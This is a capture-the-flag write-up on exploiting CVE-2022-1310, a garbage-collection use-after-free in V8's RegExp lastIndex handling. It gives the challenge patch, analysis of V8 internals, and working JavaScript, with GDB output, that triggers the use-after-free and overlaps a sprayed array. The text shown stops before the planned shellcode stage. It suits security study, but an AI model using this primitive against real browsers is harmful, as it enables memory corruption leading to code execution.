# osu-v8

> Author: rycbar<br>
> Description: You’re probably accessing the osu website with Chromium, right?<br>
> Attachment: [dist.zip](https://github.com/d0UBleW/ctf/raw/main/osu-2024/pwn/osu-v8/dist.zip)

<div class="hidden">
    <details>
        <summary>Keywords</summary>
        osu!gaming CTF 2024, pwn, browser, V8, V8 garbage collection, UAF, V8 sandbox, wasm 
    </details>
</div>

> [!TIP]
> Some lines of code may be hidden for brevity.
>
> Unhide the lines by clicking the `eye` button on top right corner of the code block

## TL;DR

- CVE-2022-1310 on V8 version 12.2.0 (8cf17a14a78cc1276eb42e1b4bb699f705675530, 2024-01-04)
- UAF on `RegExp().lastIndex` to create fake object (`PACKED_DOUBLE_ELEMENTS` array)
- Use the fake object to build other primitives, i.e., `addrof` and caged read/write
- shellcode execution via wasm instance object

## Patch Analysis

> [!NOTE]
> Read this [section](#osint) if you are interested on how I found the CVE identifier

The given patch is the reverse of the fix for CVE-2022-1310 and disable functions
built into `d8` which force players to get RCE instead of reading the flag
directly with `read('flag.txt')`.

```diff
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index eb804e52b18..89f4af9c8b6 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3284,23 +3284,23 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));

-  global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
-  global_template->Set(isolate, "printErr",
-                       FunctionTemplate::New(isolate, PrintErr));
-  global_template->Set(isolate, "write",
-                       FunctionTemplate::New(isolate, WriteStdout));
-  if (!i::v8_flags.fuzzing) {
-    global_template->Set(isolate, "writeFile",
-                         FunctionTemplate::New(isolate, WriteFile));
-  }
-  global_template->Set(isolate, "read",
-                       FunctionTemplate::New(isolate, ReadFile));
-  global_template->Set(isolate, "readbuffer",
-                       FunctionTemplate::New(isolate, ReadBuffer));
-  global_template->Set(isolate, "readline",
-                       FunctionTemplate::New(isolate, ReadLine));
-  global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+  // global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
+  // global_template->Set(isolate, "printErr",
+  //                      FunctionTemplate::New(isolate, PrintErr));
+  // global_template->Set(isolate, "write",
+  //                      FunctionTemplate::New(isolate, WriteStdout));
+  // if (!i::v8_flags.fuzzing) {
+  //   global_template->Set(isolate, "writeFile",
+  //                        FunctionTemplate::New(isolate, WriteFile));
+  // }
+  // global_template->Set(isolate, "read",
+  //                      FunctionTemplate::New(isolate, ReadFile));
+  // global_template->Set(isolate, "readbuffer",
+  //                      FunctionTemplate::New(isolate, ReadBuffer));
+  // global_template->Set(isolate, "readline",
+  //                      FunctionTemplate::New(isolate, ReadLine));
+  // global_template->Set(isolate, "load",
+  //                      FunctionTemplate::New(isolate, ExecuteFile));
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
diff --git a/src/regexp/regexp-utils.cc b/src/regexp/regexp-utils.cc
index 22abd702805..a9b1101f9a7 100644
--- a/src/regexp/regexp-utils.cc
+++ b/src/regexp/regexp-utils.cc
@@ -50,7 +50,7 @@ MaybeHandle<Object> RegExpUtils::SetLastIndex(Isolate* isolate,
       isolate->factory()->NewNumberFromInt64(value);
   if (HasInitialRegExpMap(isolate, *recv)) {
     JSRegExp::cast(*recv)->set_last_index(*value_as_object,
-                                          UPDATE_WRITE_BARRIER);
+                                          SKIP_WRITE_BARRIER);
     return recv;
   } else {
     return Object::SetProperty(
```

## Vulnerability Analysis

Looking into the patched function, we could see that when updating the `lastIndex`
[property](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex#examples)
on a `RegExp` object, there is no update on write barrier.

A write barrier, essentially, is an indicator used by the garbage collector (GC) to
perform remarking on the whole heap[^wb]. Looking into the [source code](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/objects.h;l=50;drc=f4a00cc248dd2dc8ec8759fb51620d47b5114090;bpv=0;bpt=1),
we could infer that the `UPDATE_WRITE_BARRIER` forces the GC to do remarking, while `SKIP_WRITE_BARRIER` does not.
`UPDATE_WRITE_BARRIER` exists because there is a type of garbage collection, called minor GC,
which only do marking on some part of the heap. With `UPDATE_WRITE_BARRIER`, the
GC could tell that an object `X` is reference by other object `Y` that lives on
the other part of the heap, which minor GC does not act on. As a result, this object
`X` would not be free and this prevent UAF.

```cpp
// UNSAFE_SKIP_WRITE_BARRIER skips the write barrier.
// SKIP_WRITE_BARRIER skips the write barrier and asserts that this is safe in
// the MemoryOptimizer
// UPDATE_WRITE_BARRIER is doing the full barrier, marking and generational.
enum WriteBarrierMode {
  SKIP_WRITE_BARRIER,
  UNSAFE_SKIP_WRITE_BARRIER,
  UPDATE_EPHEMERON_KEY_WRITE_BARRIER,
  UPDATE_WRITE_BARRIER
};
```

Using `SKIP_WRITE_BARRIER` makes sense when the `lastIndex` property is a small immediate integer (SMI).
However, if we trace back to the previous lines of code, we could see that `value`
goes through `NewNumberFromInt64`. Another thing to take note is that our `RegExp` object
prototype should not be modified such that `HasInitialRegExpMap` returns true.

```cpp
MaybeHandle<Object> RegExpUtils::SetLastIndex(Isolate* isolate,
                                              Handle<JSReceiver> recv,
                                              uint64_t value) {
  Handle<Object> value_as_object =
      isolate->factory()->NewNumberFromInt64(value);
  if (HasInitialRegExpMap(isolate, *recv)) {
    JSRegExp::cast(*recv)->set_last_index(*value_as_object,
                                          SKIP_WRITE_BARRIER);
    return recv;
  } else {
    return Object::SetProperty(
        isolate, recv, isolate->factory()->lastIndex_string(), value_as_object,
        StoreOrigin::kMaybeKeyed, Just(kThrowOnError));
  }
}
```

Looking into `NewNumberFromInt64` function, we could see that it could return
either an SMI or a `HeapNumber` object. The latter case occurs when:
- `value` is bigger than the maximum value of SMI
- `value` is lower than the minimum value of SMI

```cpp
// v8/src/heap/factory-base-inl.h
template <typename Impl>
template <AllocationType allocation>
Handle<Object> FactoryBase<Impl>::NewNumberFromInt64(int64_t value) {
  if (value <= std::numeric_limits<int32_t>::max() &&
      value >= std::numeric_limits<int32_t>::min() &&
      Smi::IsValid(static_cast<int32_t>(value))) {
    return handle(Smi::FromInt(static_cast<int32_t>(value)), isolate());
  }
  return NewHeapNumber<allocation>(static_cast<double>(value));
}
```

Since SMI is 31-bit in size and covers positive and negative integers, the range is[^smi-range]:

$$ [-2^{30}, 2^{30}-1] $$
$$ [-1073741824, 1073741823] $$

Now, let's take a look at the [vulnerability details](https://issues.chromium.org/action/issues/40059133/attachments/53188081?download=false)
and try to re-create the PoC. Essentially, with the `SKIP_WRITE_BARRIER`, we
could cause the GC to free the `HeapNumber` object created by `NewNumberFromInt64`
which makes the `lastIndex` property to be a dangling pointer (UAF).

[^wb]: <https://v8.dev/blog/concurrent-marking>

[^smi-range]: <https://medium.com/fhinkel/v8-internals-how-small-is-a-small-integer-e0badc18b6da>

## Exploit Development

### Getting UAF

#### TL;DR

1. create a `RegExp` object (`re`)
2. force major gc such that `re` goes into `OldSpace`
3. this makes `re.lastIndex` heap number to be allocated at `NewSpace`
4. force minor gc
5. garbage collection results in the previous `HeapNumber` object to be freed due to `SKIP_WRITE_BARRIER` causing the GC to not be aware that `re` object has reference to this `HeapNumber`
6. UAF profit

#### Explanation

First, let's try to grep which part of code calls into `SetLastIndex` function.

```console
$ grep -nrP 'SetLastIndex\(' *
src/runtime/runtime-regexp.cc:1425:    RETURN_ON_EXCEPTION(isolate, RegExpUtils::SetLastIndex(isolate, regexp, 0),
src/runtime/runtime-regexp.cc:1725:        isolate, RegExpUtils::SetLastIndex(isolate, splitter, string_index));
src/runtime/runtime-regexp.cc:1849:                                RegExpUtils::SetLastIndex(isolate, recv, 0));
src/regexp/regexp-utils.cc:46:MaybeHandle<Object> RegExpUtils::SetLastIndex(Isolate* isolate,
src/regexp/regexp-utils.cc:205:  return SetLastIndex(isolate, regexp, new_last_index);
src/regexp/regexp-utils.h:27:  static V8_WARN_UNUSED_RESULT MaybeHandle<Object> SetLastIndex(
```

Looking through the result, there are 4 places where it is invoked:

- `src/runtime/runtime-regexp.cc:1425`: this is part of `RegExpReplace(Isolate, Handle, Handle, Handle)` function which is supposed to be called when executing `RegExp.prototype[Symbol.replace]`

    When testing via GDB, I could not seem to get into this function. Moreover, there is a comment mentioning this is a legacy implementation. Perhaps that is the reason why this line of code is unreachable.

- `src/runtime/runtime-regexp.cc:1725`: this is part of `Runtime_RegExpSplit` function which is called when executing [`RegExp.prototype[ @@split ]`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/@@split#examples)

    This could potentially work but require much effort since the value is controlled by the length of the string to be split.

- `src/runtime/runtime-regexp.cc:1849`: this is part of `Runtime_RegExpReplaceRT` which is called when executing [`RegExp.prototype[ @@replace ]`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/@@replace#examples)

    This does not work as we do not control the third arguments.

- `src/regexp/regexp-utils.cc:205`: this is part of `RegExpUtils::SetAdvancedStringIndex` function

    A little spoiler, this is the one we are aiming for. Let's see explore why this is the perfect match.

Looking into `RegExpUtils::SetAdvancedStringIndex`, we could see that:
- old `lastIndex` property is retrieved
- this old `lastIndex` is add with `1` and saved to `new_last_index`
- this `new_last_index` is then passed to `SetLastIndex`

This is perfect as we have complete control over the old `lastIndex` field.

```cpp
uint64_t RegExpUtils::AdvanceStringIndex(Handle<String> string, uint64_t index,
                                         bool unicode) {
  DCHECK_LE(static_cast<double>(index), kMaxSafeInteger);
  const uint64_t string_length = static_cast<uint64_t>(string->length());
  if (unicode && index < string_length) {
    const uint16_t first = string->Get(static_cast<uint32_t>(index));
    if (first >= 0xD800 && first <= 0xDBFF && index + 1 < string_length) {
      DCHECK_LT(index, std::numeric_limits<uint64_t>::max());
      const uint16_t second = string->Get(static_cast<uint32_t>(index + 1));
      if (second >= 0xDC00 && second <= 0xDFFF) {
        return index + 2;
      }
    }
  }
  return index + 1;
}

MaybeHandle<Object> RegExpUtils::SetAdvancedStringIndex(
    Isolate* isolate, Handle<JSReceiver> regexp, Handle<String> string,
    bool unicode) {
  Handle<Object> last_index_obj;
  ASSIGN_RETURN_ON_EXCEPTION(
      isolate, last_index_obj,
      Object::GetProperty(isolate, regexp,
                          isolate->factory()->lastIndex_string()),
      Object);

  ASSIGN_RETURN_ON_EXCEPTION(isolate, last_index_obj,
                             Object::ToLength(isolate, last_index_obj), Object);
  const uint64_t last_index = PositiveNumberToUint64(*last_index_obj);
  const uint64_t new_last_index =
      AdvanceStringIndex(string, last_index, unicode);

  return SetLastIndex(isolate, regexp, new_last_index);
}
```

Next, let's see which function calls into `RegExpUtils::SetAdvancedStringIndex`.

```console
$ grep -nrP 'SetAdvancedStringIndex\(' *
src/runtime/runtime-regexp.cc:1874:      RETURN_FAILURE_ON_EXCEPTION(isolate, RegExpUtils::SetAdvancedStringIndex(
src/regexp/regexp-utils.cc:189:MaybeHandle<Object> RegExpUtils::SetAdvancedStringIndex(
src/regexp/regexp-utils.h:49:  static V8_WARN_UNUSED_RESULT MaybeHandle<Object> SetAdvancedStringIndex(
```

There is only 1 place and it is called inside `Runtime_RegExpReplaceRT` function.

```cpp
// Slow path for:
// ES#sec-regexp.prototype-@@replace
// RegExp.prototype [ @@replace ] ( string, replaceValue )
RUNTIME_FUNCTION(Runtime_RegExpReplaceRT) {
  HandleScope scope(isolate);
  DCHECK_EQ(3, args.length());

  Handle<JSReceiver> recv = args.at<JSReceiver>(0);
  Handle<String> string = args.at<String>(1);
  Handle<Object> replace_obj = args.at(2);

  Factory* factory = isolate->factory();

  // ...

  // Fast-path for unmodified JSRegExps (and non-functional replace).
  if (RegExpUtils::IsUnmodifiedRegExp(isolate, recv)) {  // [0]
    // We should never get here with functional replace because unmodified
    // regexp and functional replace should be fully handled in CSA code.
    CHECK(!functional_replace);
    Handle<Object> result;
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
        isolate, result,
        RegExpReplace(isolate, Handle<JSRegExp>::cast(recv), string, replace));
    DCHECK(RegExpUtils::IsUnmodifiedRegExp(isolate, recv));
    return *result;
  }

  const uint32_t length = string->length();

  Handle<Object> global_obj;
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
      isolate, global_obj,
      JSReceiver::GetProperty(isolate, recv, factory->global_string()));
  const bool global = Object::BooleanValue(*global_obj, isolate);  // [1]

  bool unicode = false;
  if (global) {  // [2]
    Handle<Object> unicode_obj;
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
        isolate, unicode_obj,
        JSReceiver::GetProperty(isolate, recv, factory->unicode_string()));
    unicode = Object::BooleanValue(*unicode_obj, isolate);

    RETURN_FAILURE_ON_EXCEPTION(isolate,
                                RegExpUtils::SetLastIndex(isolate, recv, 0));  // [3]
  }

  base::SmallVector<Handle<Object>, kStaticVectorSlots> results;

  while (true) {
    Handle<Object> result;
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
        isolate, result, RegExpUtils::RegExpExec(isolate, recv, string,  // [4]
                                                 factory->undefined_value()));

    if (IsNull(*result, isolate)) break;

    results.emplace_back(result);
    if (!global) break;  // [5]

    Handle<Object> match_obj;
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, match_obj,
                                       Object::GetElement(isolate, result, 0));

    Handle<String> match;
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, match,
                                       Object::ToString(isolate, match_obj));

    if (match->length() == 0) {  // [6]
      RETURN_FAILURE_ON_EXCEPTION(isolate, RegExpUtils::SetAdvancedStringIndex(  // [7]
                                               isolate, recv, string, unicode));
    }
  }

  // ...
}
```

Based on trial-and-error, the fast-path is never taken [0] but we can ensure it
to be not taken by modifying our `RegExp` object prototype.
In order to get into `SetAdvancedStringIndex` [7], we need to first pass the
`global` variable check [5]. This variable is retrieved from the `RegExp` object
[1], which basically the flags modifier when instantiating the object. Before
`SetAdvancedStringIndex` is called, the prototype `exec` is first called [4],
and it then checks if the result is not `NULL`. Since `global` is set to `true`,
the loop does not break and it tries to get the element at index `0` then tries
to convert the element to string. Finally, it checks if the matched string length
is `0` [6], and if it is, `SetAdvancedStringIndex` is called. One thing to note
is that since `global` is set to `true` the `lastIndex` property is always reset
to `0` [3]. The workaround for this will be discussed shortly.

Now, let's take a look at the following code.

```js
// RegExp(pattern, flags)
var re = new RegExp("", "g");
re.lastIndex = 1337;
re[Symbol.replace]("", "l33t");
console.log(re.lastIndex);  // output: 0
```

Since we want the return value of `RegExpExec` to be `[""]`, we could try to use
`""` as the pattern or pass in empty string for the first argument. We could run
it inside GDB and place a breakpoint on `SetAdvancedStringIndex` to see if it is
called. Unfortunately, our breakpoint is not hit. If we execute `re.exec("")`,
we could see that the output is actually `null` instead of `[""]`. Since this is
JavaScript, we could modify the behaviour `re.exec` by simply overwriting it
with our own supplied function.

```js
var re = new RegExp("leet", "g");
re.lastIndex = 1337;
re.exec = function () {
    return [""]  // to get into `SetAdvancedStringIndex`
}
re[Symbol.replace]("", "l33t");  // infinite loop
console.log(re.lastIndex);
```

Notice that the program just hangs as we are stuck inside an infinite loop.
This is because `if (IsNull(*result, isolate)) break;` is never executed as
now `RegExpExec` returns `[""]`. To circumvent this, we could just overwrite
this function again to return `null`.
```js
var re = new RegExp("leet", "g");
re.lastIndex = 1337;
re.exec = function () {
    re.exec = function () { return null; };  // to avoid infinite loop
    return [""];  // to get into `SetAdvancedStringIndex`
}
re[Symbol.replace]("", "l33t");
console.log(re.lastIndex);  // 0
```

If we run it inside GDB and set a breakpoint on `SetAdvancedStringIndex`, we
could see that the breakpoint is indeed hit but our final `re.lastIndex` is
still `0`. Recall that it is reset to `0` on every `Runtime_RegExpReplaceRT` call [3].
However, notice that `RegExpExec` is called after [3]. This means that we could
re-assign `re.lastIndex` inside our modified `re.exec` function and when `SetAdvancedStringIndex`
is called, `re.lastIndex` is not `0` anymore.

```js
var re = new RegExp("leet", "g");
re.lastIndex = 1337;
re.exec = function () {
    re.lastIndex = 1337;
    re.exec = function () { return null; };  // to avoid infinite loop
    return [""];  // to get into `SetAdvancedStringIndex`
}
re[Symbol.replace]("", "l33t");
console.log(re.lastIndex);  // 1338 == 1337+1
```

Finally, the final `re.lastIndex` is `1` more than `1337` which is to be expected
but recall that to skip the write barrier, we need to pass `HasInitialRegExpMap`
check which is only possible if we do not mess with our object prototype. One
way to achieve this is to do `delete re.exec;` such that subsequent call to `re.exec`
goes into `RegExp.prototype.exec`. However, doing so results in `re.lastIndex`
no longer `1338` but `0`. Apparently, the original `RegExp.prototype.exec`
messes with `lastIndex` property as well. Luckily, since this is JavaScript, we could
overwrite `RegExp.prototype.exec` as well.

```js
var re = new RegExp("leet", "g");
var exec_bak = RegExp.prototype.exec;  // backup original exec()
RegExp.prototype.exec = function () { return null; };
re.exec = function () {
    re.lastIndex = 1337;
    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
    return [""];  // to get into `SetAdvancedStringIndex`
}
re[Symbol.replace]("", "l33t");
console.log(re.lastIndex);  // 1338 == 1337+1
RegExp.prototype.exec = exec_bak;  // restore original exec()
```

Now, if we set `re.lastIndex` to be `1073741824` such that it is stored as `HeapNumber` object,
we can try to simulate some garbage collection to observe how `re` and `re.lastIndex` changes.

```js
// pwn.js
var re = new RegExp("leet", "g");
var exec_bak = RegExp.prototype.exec;  // backup original exec()
RegExp.prototype.exec = function () { return null; };
var n = 1073741824
re.exec = function () {
    re.lastIndex = n;
    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
    return [""];  // to get into `SetAdvancedStringIndex`
}
re[Symbol.replace]("", "l33t");
console.assert(re.lastIndex == n + 1);  // 1073741825 == 1073741824+1
RegExp.prototype.exec = exec_bak;  // restore original exec()

eval("%DebugPrint(re)");
eval("%DebugPrint(re.lastIndex)");
eval("%SystemBreak()");

gc({type:'minor'});  // minor gc / scavenge (enabled by --expose-gc)  [1]

eval("%DebugPrint(re)");
eval("%DebugPrint(re.lastIndex)");
eval("%SystemBreak()");

gc({type:'minor'});  // minor gc / scavenge (enabled by --expose-gc)  [2]
eval("%DebugPrint(re)");
eval("%DebugPrint(re.lastIndex)");
eval("%SystemBreak()");
```

To execute the script, we need to enable some command line flags.

```sh
./d8 --allow-natives-syntax --expose-gc --trace-gc pwn.js
```

Initially, `re` lives in `NewSpace`. After `re[Symbol.replace]`, the `HeapNumber`
is allocated at `NewSpace` as well.

```console
gef> run
0x100e00048375 <JSRegExp <String[4]: #leet>>
0x100e00049045 <HeapNumber 1073741825.0>

gef> vmmap
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000100600000000 0x0000100e00000000 0x0000000800000000 0x0000000000000000 ---
0x0000100e00000000 0x0000100e00010000 0x0000000000010000 0x0000000000000000 r--   <-  $r14
0x0000100e00010000 0x0000100e00020000 0x0000000000010000 0x0000000000000000 ---
0x0000100e00020000 0x0000100e00040000 0x0000000000020000 0x0000000000000000 r--
0x0000100e00040000 0x0000100e00145000 0x0000000000105000 0x0000000000000000 rw-  # `re` and `HeapNumber` live here
0x0000100e00145000 0x0000100e00180000 0x000000000003b000 0x0000000000000000 ---
0x0000100e00180000 0x0000100e001c0000 0x0000000000040000 0x0000000000000000 rw-   <-  $r8  
0x0000100e001c0000 0x0000100e00300000 0x0000000000140000 0x0000000000000000 ---
0x0000100e00300000 0x0000100e00314000 0x0000000000014000 0x0000000000000000 r--
0x0000100e00314000 0x0000100e00340000 0x000000000002c000 0x0000000000000000 ---
0x0000100e00340000 0x0000111600000000 0x00000107ffcc0000 0x0000000000000000 ---
0x0000354600000000 0x0000354600040000 0x0000000000040000 0x0000000000000000 rw-
0x0000354600040000 0x0000354610000000 0x000000000ffc0000 0x0000000000000000 ---
```

Next, when we do minor GC [1], both `re` and `HeapNumber` moves to
`Intermediary/To-Space` of `NewSpace`.

```console
gef> c
[7022:0x555556d7b000]   139382 ms: Scavenge 0.1 (1.5) -> 0.1 (1.5) MB, 16.24 / 0.00 ms  (average mu = 1.000, current mu = 1.000) testing;
0x100e001c755d <JSRegExp <String[4]: #leet>>
0x100e001c75d5 <HeapNumber 1073741825.0>

gef> vmmap
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000100600000000 0x0000100e00000000 0x0000000800000000 0x0000000000000000 ---
0x0000100e00000000 0x0000100e00010000 0x0000000000010000 0x0000000000000000 r--   <-  $r14
0x0000100e00010000 0x0000100e00020000 0x0000000000010000 0x0000000000000000 ---
0x0000100e00020000 0x0000100e00040000 0x0000000000020000 0x0000000000000000 r--
0x0000100e00040000 0x0000100e00140000 0x0000000000100000 0x0000000000000000 ---
0x0000100e00140000 0x0000100e00145000 0x0000000000005000 0x0000000000000000 rw-
0x0000100e00145000 0x0000100e00180000 0x000000000003b000 0x0000000000000000 ---
0x0000100e00180000 0x0000100e002c0000 0x0000000000140000 0x0000000000000000 rw-   <-  $r8  # `re` and `HeapNumber` live here
0x0000100e002c0000 0x0000100e00300000 0x0000000000040000 0x0000000000000000 ---
0x0000100e00300000 0x0000100e00314000 0x0000000000014000 0x0000000000000000 r--
0x0000100e00314000 0x0000100e00340000 0x000000000002c000 0x0000000000000000 ---
0x0000100e00340000 0x0000111600000000 0x00000107ffcc0000 0x0000000000000000 ---
0x0000354600000000 0x0000354600040000 0x0000000000040000 0x0000000000000000 rw-
0x0000354600040000 0x0000354610000000 0x000000000ffc0000 0x0000000000000000 ---
```

If we do minor GC once more [2], both `re` and `HeapNumber` would move to the `OldSpace`.

```console
gef> c
[7022:0x555556d7b000]   264864 ms: Scavenge 0.1 (1.5) -> 0.1 (1.5) MB, 18.34 / 0.00 ms  (average mu = 1.000, current mu = 1.000) testing;
0x100e0019f02d <JSRegExp <String[4]: #leet>>
0x100e0019f0a5 <HeapNumber 1073741825.0>

gef> vmmap
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000100600000000 0x0000100e00000000 0x0000000800000000 0x0000000000000000 ---
0x0000100e00000000 0x0000100e00010000 0x0000000000010000 0x0000000000000000 r--   <-  $r14
0x0000100e00010000 0x0000100e00020000 0x0000000000010000 0x0000000000000000 ---
0x0000100e00020000 0x0000100e00040000 0x0000000000020000 0x0000000000000000 r--
0x0000100e00040000 0x0000100e00145000 0x0000000000105000 0x0000000000000000 rw-
0x0000100e00145000 0x0000100e00180000 0x000000000003b000 0x0000000000000000 ---
0x0000100e00180000 0x0000100e001c0000 0x0000000000040000 0x0000000000000000 rw-   <-  $r8  # `re` and `HeapNumber` live here
0x0000100e001c0000 0x0000100e002c0000 0x0000000000100000 0x0000000000000000 ---            # (notice that the previous NewSpace have been splitted)
0x0000100e002c0000 0x0000100e00300000 0x0000000000040000 0x0000000000000000 ---
0x0000100e00300000 0x0000100e00314000 0x0000000000014000 0x0000000000000000 r--
0x0000100e00314000 0x0000100e00340000 0x000000000002c000 0x0000000000000000 ---
0x0000100e00340000 0x0000111600000000 0x00000107ffcc0000 0x0000000000000000 ---
0x0000354600000000 0x0000354600040000 0x0000000000040000 0x0000000000000000 rw-
0x0000354600040000 0x0000354610000000 0x000000000ffc0000 0x0000000000000000 ---
```

You may wonder why does the first minor GC consider `HeapNumber` as a live object
even though `re.lastIndex` is set with `SKIP_WRITE_BARRIER`. This is because minor
GC perform marking starting from `re` (since it is in `NewSpace`) and it could
reach `HeapNumber` via `re.lastIndex`. The same applies when doing major GC
instead of minor GC initially.

Things would be different if `re` lives in `OldSpace`, while `HeapNumber` lives
in `NewSpace`. When we do a minor GC, `re` is ignored as minor GC only covers `NewSpace`.
Furthermore, because of the `SKIP_WRITE_BARRIER`, the GC does not aware that
there is a reference to the `HeapNumber` from the `OldSpace`. This causes the
`HeapNumber` object to be garbage collected while `re.lastIndex` still points
to the freed memory, which is basically a UAF on `re.lastIndex`.

If `UPDATE_WRITE_BARRIER` is used instead, `HeapNumber` would eventually
transition to `OldSpace` since the GC is aware of the reference to `HeapNumber`.

```js
// pwn.js
var re = new RegExp("leet", "g");
var exec_bak = RegExp.prototype.exec;  // backup original exec()
var n = 1073741824
re.exec = function () {
    re.lastIndex = n;
    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
    return [""];  // to get into `SetAdvancedStringIndex`
}
eval("%DebugPrint(re)");
gc();  // major gc / mark and sweep: forces `re` to move into `OldSpace`
re[Symbol.replace]("", "l33t");
console.assert(re.lastIndex == n + 1);  // 1073741825 == 1073741824+1
RegExp.prototype.exec = exec_bak;  // restore original exec()

eval("%DebugPrint(re)");
eval("%DebugPrint(re.lastIndex)");

gc({type:'minor'})  // causes `HeapNumber` to be garbage collected [1]

var spray = [0.0, 1.0, 2.0, 3.0, 4.0, 5.0, 6.0, 7.0, 8.0, 9.0, 10.0]

eval("%DebugPrint(re)");
eval("%DebugPrint(spray)");
```

If we only run the code above, we notice that `re` and `HeapNumber` is not so
far apart, but they are actually on two different space. However, `spray` is
not allocated at the same space as our freed `HeapNumber`.

```console
0x228b0004837d <JSRegExp <String[4]: #leet>>
[16454:0x55d1bbdce000]        2 ms: Mark-Compact 0.1 (1.5) -> 0.1 (2.5) MB, 0.47 / 0.00 ms  (average mu = 0.645, current mu = 0.645) testing; GC in old space requested
0x228b0019a705 <JSRegExp <String[4]: #leet>>
0x228b001c2155 <HeapNumber 1073741825.0>
[16454:0x55d1bbdce000]        2 ms: Scavenge 0.1 (2.5) -> 0.1 (2.5) MB, 0.03 / 0.00 ms  (average mu = 0.645, current mu = 0.645) testing;
0x228b0019a705 <JSRegExp <String[4]: #leet>>
0x228b000421dd <JSArray[11]>
```

When the minor GC [1] happens, the space occupied by `HeapNumber` is considered
as the `Nursery/From-Space` (call this `A`) space and live object is evacuated from this space
to `Intermediate/To-Space` (call this `B`). After the minor GC is done, the previous `Nursery/From-Space` (`A`)
has now become `Intermediate/To-Space` and the previous `Intermediate/To-Space` (`B`)
has now become `Nursery/From-Space`. Now, when new objects are allocated, they
would be placed on `B`, since `B` is now the `Nursery/From-Space`. Next, if we do
another minor GC, new object would now be allocated at `A` instead of `B`.


```js
var re = new RegExp("leet", "g");
var exec_bak = RegExp.prototype.exec;  // backup original exec()
RegExp.prototype.exec = function () { return null; };
var n = 1073741824
re.exec = function () {
    re.lastIndex = n;
    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
    return [""];  // to get into `SetAdvancedStringIndex`
}
eval("%DebugPrint(re)");
gc();  // major gc / mark and sweep: forces `re` to move into `OldSpace`
re[Symbol.replace]("", "l33t");
console.assert(re.lastIndex == n + 1);  // 1073741825 == 1073741824+1
RegExp.prototype.exec = exec_bak;  // restore original exec()

eval("%DebugPrint(re)");
eval("%DebugPrint(re.lastIndex)");

gc({type:'minor'})  // causes `HeapNumber` to be garbage collected
gc({type:'minor'})  // switches `Nursery` and `Intermediate` such that new object is allocated near our old `HeapNumber`

var spray = [0.0, 1.0, 2.0, 3.0, 4.0, 5.0, 6.0, 7.0, 8.0, 9.0, 10.0]

eval("%DebugPrint(re)");
eval("%DebugPrint(spray)");
```

When we run the above code, as expected, `spray` is now allocated near our old
`HeapNumber` address. Now, our `re.lastIndex` actually points to the elements of
`spray`, and we essentially have UAF and full control over the memory pointed
by `re.lastIndex`.

```console
gef> run
0x199c000483ad <JSRegExp <String[4]: #leet>>
[16796:0x555556d7b000]       14 ms: Mark-Compact 0.1 (1.5) -> 0.1 (2.5) MB, 7.07 / 0.00 ms  (average mu = 0.440, current mu = 0.440) testing; GC in old space requested
0x199c0019a71d <JSRegExp <String[4]: #leet>>
0x199c001c2155 <HeapNumber 1073741825.0>
[16796:0x555556d7b000]       25 ms: Scavenge 0.1 (2.5) -> 0.1 (2.5) MB, 5.75 / 0.00 ms  (average mu = 0.440, current mu = 0.440) testing;
[16796:0x555556d7b000]       30 ms: Scavenge 0.1 (2.5) -> 0.1 (2.5) MB, 5.73 / 0.00 ms  (average mu = 0.440, current mu = 0.440) testing;
0x199c0019a71d <JSRegExp <String[4]: #leet>>
0x199c001c21a9 <JSArray[11]>

gef> tele 0x199c001c21a8 2
0x199c001c21a8|+0x0000|+000: 0x000006cd0018ece1
0x199c001c21b0|+0x0008|+001: 0x00000016001c2149
gef> tele 0x199c001c2148 10
0x199c001c2148|+0x0000|+000: 0x0000001600000851
0x199c001c2150|+0x0008|+001: 0x3fb999999999999a
0x199c001c2158|+0x0010|+002: 0x3ff199999999999a
0x199c001c2160|+0x0018|+003: 0x4000cccccccccccd
0x199c001c2168|+0x0020|+004: 0x4008cccccccccccd
0x199c001c2170|+0x0028|+005: 0x4010666666666666
0x199c001c2178|+0x0030|+006: 0x4014666666666666
0x199c001c2180|+0x0038|+007: 0x4018666666666666
0x199c001c2188|+0x0040|+008: 0x401c666666666666
0x199c001c2190|+0x0048|+009: 0x4020333333333333
```

TODO: create own major and minor gc

## Reference

- <https://issues.chromium.org/issues/40059133>
- <https://v8.dev/blog/concurrent-marking>
- <https://v8.dev/blog/trash-talk>
- <https://zhuanlan.zhihu.com/p/545824240?utm_id=0>
- <https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Bohan%20Liu%20Zheng%20Wang%20GuanCheng%20Li%20-%20ndays%20are%20also%200days%20Can%20hackers%20launch%200day%20RCE%20attack%20on%20popular%20softwares%20only%20with%20chromium%20ndays.pdf>
